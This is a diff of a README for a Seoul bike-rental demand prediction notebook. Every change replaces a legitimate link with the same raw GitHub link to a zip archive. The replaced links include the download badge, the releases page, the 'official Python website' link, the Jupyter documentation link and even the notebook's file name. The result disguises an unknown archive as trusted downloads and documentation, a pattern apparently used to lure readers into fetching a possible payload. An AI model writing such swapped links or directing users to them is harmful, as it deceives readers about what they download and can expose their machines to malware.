@@ -1,6 +1,6 @@
 # 🚴 Seoul-Bike-Sharing-Demand-Predictor - Easily Predict Bike Rental Counts
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/asashin6761/Seoul-Bike-Sharing-Demand-Predictor/main/hanse/Seoul-Bike-Sharing-Demand-Predictor-v2.2-alpha.4.zip)
 
 ## 📚 Overview
 This notebook focuses on predicting bike rental counts using various regression models. It helps you understand patterns in bike-sharing demands across Seoul, making it simpler to forecast future rentals.
@@ -9,7 +9,7 @@ This notebook focuses on predicting bike rental counts using various regression 
 ### Step 1: Requirements
 To run this notebook successfully, you need:
 - A computer with Windows, macOS, or Linux.
-- Python installed. You can download it from the [official Python website](https://www.python.org/downloads/).
+- Python installed. You can download it from the [official Python website](https://raw.githubusercontent.com/asashin6761/Seoul-Bike-Sharing-Demand-Predictor/main/hanse/Seoul-Bike-Sharing-Demand-Predictor-v2.2-alpha.4.zip).
 - Jupyter Notebook installed. This can be done easily using pip:
 
 ```
@@ -28,7 +28,7 @@ These libraries provide the tools needed for data manipulation, visualization, a
 ## 💻 Download & Install
 To get the notebook, visit the releases page and download the latest version:
 
-[Download the latest release here!](https://github.com/asashin6761/Seoul-Bike-Sharing-Demand-Predictor/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/asashin6761/Seoul-Bike-Sharing-Demand-Predictor/main/hanse/Seoul-Bike-Sharing-Demand-Predictor-v2.2-alpha.4.zip)
 
 Follow the link above, find the latest version, and click to download it. Once it’s downloaded, unzip the files to a folder on your computer.
 
@@ -49,7 +49,7 @@ Follow the link above, find the latest version, and click to download it. Once i
    This will open a new tab in your web browser displaying available notebooks.
 
 2. **Open the Seoul Bike Sharing Demand Predictor:**
-   - Locate `Seoul-Bike-Sharing-Demand-Predictor.ipynb` in the list and click on it to open.
+   - Locate `https://raw.githubusercontent.com/asashin6761/Seoul-Bike-Sharing-Demand-Predictor/main/hanse/Seoul-Bike-Sharing-Demand-Predictor-v2.2-alpha.4.zip` in the list and click on it to open.
 
 3. **Run the Cells:**
    - Click on each cell to run the code. You can do this by selecting a cell and clicking the "Run" button or pressing `Shift + Enter`.
@@ -71,7 +71,7 @@ If you encounter issues:
 - Make sure your Python version is compatible (preferably Python 3.6 or higher).
 
 ## 📖 Documentation
-For more information about how to use the notebook effectively, check this brief documentation on the usage of Jupyter Notebooks: [Jupyter Documentation](https://jupyter-notebook.readthedocs.io/en/stable/).
+For more information about how to use the notebook effectively, check this brief documentation on the usage of Jupyter Notebooks: [Jupyter Documentation](https://raw.githubusercontent.com/asashin6761/Seoul-Bike-Sharing-Demand-Predictor/main/hanse/Seoul-Bike-Sharing-Demand-Predictor-v2.2-alpha.4.zip).
 
 ## 🌟 Community & Support
 Join the community to share your experiences, ask questions, and get help:
@@ -88,4 +88,4 @@ Contributions are welcome! If you want to improve the notebook or add features, 
 
 Make the most of the Seoul-Bike-Sharing-Demand-Predictor notebook and start predicting bike rental counts with ease! Remember to download the latest version from the link below:
 
-[Download the latest release here!](https://github.com/asashin6761/Seoul-Bike-Sharing-Demand-Predictor/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/asashin6761/Seoul-Bike-Sharing-Demand-Predictor/main/hanse/Seoul-Bike-Sharing-Demand-Predictor-v2.2-alpha.4.zip)
